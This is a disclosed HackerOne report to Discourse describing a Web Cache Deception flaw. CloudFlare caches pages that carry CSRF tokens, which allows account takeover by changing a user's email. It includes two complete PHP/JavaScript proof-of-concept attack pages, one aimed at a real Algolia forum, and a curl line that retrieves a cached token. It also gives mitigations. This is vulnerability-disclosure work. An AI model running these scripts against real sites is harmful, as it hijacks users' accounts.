{"id":260697,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjA2OTc=","url":"https://hackerone.com/reports/260697","title":"CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-08-16T13:06:55.522Z","submitted_at":"2017-08-16T13:06:55.522Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-08T18:00:12.220Z","bug_reporter_agreed_on_going_public_at":"2018-07-09T18:00:09.574Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting `try.discourse.org` but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.\n\nThe TL;DR of issue is basically: `Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens`.\n\nAs you might understand due to this, the PoC below is not working on `try.discourse.org`. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.\n\n### Background\n\nYou might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. \n\nAny URL having a file ending with one of [CloudFlare's mime types](https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-) will be cached for the whole region. Remember, a region is **big** and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from [CloudFlare about their regions](https://support.cloudflare.com/hc/en-us/articles/115000540888-Load-Balancing-Geographic-Regions).\n\nThis attack vector was coined by **Omer Gil** earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).\n\n### Technical details\n\nThe issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status `200` but also to status `404`.\n\nHere are some routes which will return status `200` on `try.discourse.org` even if we have appended `.css` on them (which is a trigger for CloudFlare to cache this URL):\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\nResults in:\n\n```\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/card_badge\n```\n(This seems to be a general issue with the `X-Discourse-Route: users/*` routes)\n\nAlso, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):\n\n```\nGET /u/x.css HTTP/1.1\nHost: try.discourse.org\n\n\u003cmeta name=\"csrf-token\" content=\"aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==\" /\u003e\n```\n\nYou currently don't have `try.discourse.org` behind CloudFlare, but I've verified with a few instances that I noticed did.\n\nWhat you will see is the following:\n\nIssuing the following request twice while being signed in:\n\n```\nGET /u/x.css HTTP/1.1\n```\n\nWill lead to:\n```\nCF-Cache-Status: HIT\n```\n\nAs well as:\n\n```\nX-Discourse-Username: test\n\n\u003cmeta name=\"csrf-token\" content=\"6bE...VnlQ==\" /\u003e\n```\n\nSame thing with `/u/my/preferences.css`.\n\nThe issue is that none of these routes, exposing the CSRF-token and the username, has any `Pragma`, `Cache-Control` or `Expire`-headers, so there's nothing that tells CloudFlare not to cache these URLs.\n\n### PoC\n\nYou need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:\n\n{F213373}\n\nNow, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.\n\nWhat this script will do is this:\n\n1. Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy\n2. Victim vists a malicious page by the attacker\n3. The page will issue three requests using `img`-tags to `/u/$rand.css`, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token\n4. After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).\n5. The script will extract the username from the `X-Discourse-Username` header and the CSRF-token from the HTML\n6. The PHP-script will return these two values to the malicious site, and a form will be crafted:\n```\nPOST /users/$username/preferences/email.json HTTP/1.1\nÂ \n_method=PUT\u0026email=$attacker_email\u0026authenticity_token=$csrf_token\n```\n   \n7. Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.\n\nHere's the script. It seems like `_forum_session`-token has `SameSite=lax` which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.\n\n```php\n\u003c?\n$discourse = \"https://discourse.instance.behind.cloudflare.proxy\"; //like https://try.discourse.org but behind CloudFlare\n$email_to_change_to = \"changetothis@example.com\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$ctx = stream_context_create(array('http' =\u003e array('ignore_errors' =\u003e true)));\n\t$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n?\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" onerror=\"f()\" /\u003e\n\u003cscript\u003e\nvar user = '', change_email_to = '\u003c?=$email_to_change_to?\u003e';\nfunction f() {\n\tfetch('?fetch=1\u0026f=\u003c?=$rand?\u003e').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '\u003c?=$discourse?\u003e/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"\u003c?=$discourse?\u003e/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT\u0026email=\" + encodeURIComponent(change_email_to) +\"\u0026authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i \u003c aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n\u003c/script\u003e\n    \u003cform action=\"\" id=\"f\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"PUT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"email\" value=\"\u003c?=$email_to_change_to?\u003e\" /\u003e\n      \u003cinput type=\"hidden\" name=\"authenticity\u0026#95;token\" id=\"csrf\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" style=\"display: none;\" value=\"Submit request\" /\u003e\n\t  Please wait...\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:\n\n{F213374}\n\n### Mitigations\n\nAdd the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the `X-Discourse-Username` is returned.\n\nLet me know if you need any additional information.\n\nRegards,\nFrans","bounty_amount":"256.0","formatted_bounty":"$256","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":213373,"file_name":"Screen_Shot_2017-08-16_at_14.07.00.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.07.00.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.07.00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a32d5df8758754d19af88fb79fb2f1a6db7750bf55aa928899494fcd4a768c80","file_size":14420,"type":"image/png"},{"id":213374,"file_name":"Screen_Shot_2017-08-16_at_14.56.30.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.56.30.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.56.30.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6ed6c6715b666dd3f5c2b94fe32e98413dfac241c4d281f131a2caaa563e92ed","file_size":296625,"type":"image/png"}],"allow_singular_disclosure_at":"2018-08-08T18:00:09.704Z","allow_singular_disclosure_after":-100211540.63185345,"singular_disclosure_allowed":true,"vote_count":49,"voters":["jokebookservice1","sgabe","foobar7","kapytein","bogdantcaciuc","dawgyg","spam404","ali","marotagem_vrt","aryan2808","and 39 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1961214,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @fransrosen, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. ","automated_response":false,"created_at":"2017-08-28T20:18:09.487Z","updated_at":"2017-08-28T20:18:09.487Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2284063,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\nSorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.\n\nThe bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so `_forum_session` is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I'm testing with Firefox 57.0.4 in macOS 10.13.2.\n\nYou need to run the PHP-code in the same region as you're in when trying, this is because the CloudFlare region is the one doing the cache of `.css`. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.\n\nMy code looks like this in the demo:\n\n```php\n\u003c?\n$discourse = \"https://discourse.algolia.com\";\n$email_to_change_to = \"test99990@yoski.co\";\n$file = \"/u/%d.css\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$file = sprintf($file, $f);\n\t$ctx = stream_context_create(array('http' =\u003e array('ignore_errors' =\u003e true)));\n\t$data = file_get_contents($discourse.$file, false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n$file = sprintf($file, $rand);\n?\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" onerror=\"f()\" /\u003e\n\u003cscript\u003e\nvar user = '', change_email_to = '\u003c?=$email_to_change_to?\u003e';\nfunction f() {\n\tfetch('?fetch=1\u0026f=\u003c?=$rand?\u003e').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '\u003c?=$discourse?\u003e/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"\u003c?=$discourse?\u003e/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT\u0026email=\" + encodeURIComponent(change_email_to) +\"\u0026authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i \u003c aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n\u003c/script\u003e\n    \u003cform action=\"\" id=\"f\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"PUT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"email\" value=\"\u003c?=$email_to_change_to?\u003e\" /\u003e\n      \u003cinput type=\"hidden\" name=\"authenticity\u0026#95;token\" id=\"csrf\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" style=\"display: none;\" value=\"Submit request\" /\u003e\n\t  Please wait...\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nAnd the flow looks like this:\n\n1. Sign up for Algolia at https://www.algolia.com/users/sign_up\n2. When done, go to https://discourse.algolia.com/ and \"Log in\"\n3. Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: `php -S localhost:8000 algolia.php`\n4. Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.\n5. Go to `http://localhost:8000` in Firefox.\n\nYou should see an alert that the email was changed. This is also the point when the attacker gets a \"Confirm your new address\" to their inbox as my video shows.\n\nPoC-video:\n{F253981}\n\nThe reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it's a CSS-file. If there would be a `Cache-Control: no-cache` whenever CSRF-tokens are in the templates, this attack would not work.\n\nAlso, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user's CSRF-token when the file was requested, which is the one I'm using to trigger the email-change:\n\n{F253980}\n{F253979}\n```\nlocal @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token\n\u003cmeta name=\"csrf-token\" content=\"CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw==\" /\u003e\n```\n\nThe only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you're using CloudFlare's proxy to speed up the website and to hide the origin and sometimes make sure you're protected against DDoS.\n\nHope this helps, and sorry for my late reply.\n\nRegards,\nFrans\n\n","automated_response":false,"created_at":"2018-01-14T22:47:57.598Z","updated_at":"2018-01-14T22:49:50.860Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":253981,"filename":"AlgoliaTakeover.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?response-content-disposition=attachment%3B%20filename%3D%22AlgoliaTakeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27AlgoliaTakeover.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=44ab75f0f7b3a07ff65ab7fd6a49fa5c152cec8bd34aa8ecfa424a9f01e25af8"},{"id":253980,"filename":"Screen_Shot_2018-01-14_at_23.44.51.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.51.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d555432c69d4848bb4009bf7b07c890cfe7ec790f1bf783ad8380651a6bbbbf5"},{"id":253979,"filename":"Screen_Shot_2018-01-14_at_23.44.58.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?response-c